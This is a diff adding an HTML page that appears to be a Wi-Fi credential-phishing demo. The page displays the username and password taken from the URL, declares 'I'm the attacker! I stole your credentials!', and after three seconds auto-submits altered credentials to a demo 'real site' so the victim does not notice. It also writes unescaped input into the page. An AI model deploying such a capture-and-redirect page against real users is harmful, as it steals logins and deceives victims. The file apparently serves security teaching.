@@ -1,0 +1,70 @@
+<html>
+
+<body style="font-size: 14pt">
+    <script type="text/javascript">
+        /**
+         * sends a request to the specified url from a form. this will change the window location.
+         * https://stackoverflow.com/a/133997
+         * @param {string} path the path to send the post request to
+         * @param {object} params the paramiters to add to the url
+         * @param {string} [method=post] the method to use on the form
+         */
+
+        function post(path, params, method = 'post') {
+
+            // The rest of this code assumes you are not using a library.
+            // It can be made less wordy if you use one.
+            const form = document.createElement('form');
+            form.method = method;
+            form.action = path;
+
+            for (const key in params) {
+                if (params.hasOwnProperty(key)) {
+                    const hiddenField = document.createElement('input');
+                    hiddenField.type = 'hidden';
+                    hiddenField.name = key;
+                    hiddenField.value = params[key];
+
+                    form.appendChild(hiddenField);
+                }
+            }
+
+            document.body.appendChild(form);
+            form.submit();
+        }
+
+        // https://stackoverflow.com/a/5448595
+        function findGetParameter(parameterName) {
+            var result = null,
+                tmp = [];
+            location.search
+                .substr(1)
+                .split("&")
+                .forEach(function (item) {
+                    tmp = item.split("=");
+                    if (tmp[0] === parameterName) result = decodeURIComponent(tmp[1]);
+                });
+            return result;
+        }
+    </script>
+
+    I'm the attacker! I stole your credentials!
+    <br>
+    Your username is "<username id="username"></username>" and your password is "<password id="password"></password>"!
+    <br>
+    Now I'm sending you to the real site so you'll never know what happened. mwahahahaha...
+
+    <script>
+        let user = encodeURI(findGetParameter("username"));
+        let pass = encodeURI(findGetParameter("password"));
+        document.getElementById("username").innerHTML = user;
+        document.getElementById("password").innerHTML = pass;
+
+        setTimeout(redirect, 3000);
+        function redirect() {
+            post("http://wifidemo.lan/index.php", {username: user + "_bad", password: pass + "_1234"});
+        }
+    </script>
+</body>
+
+</html>
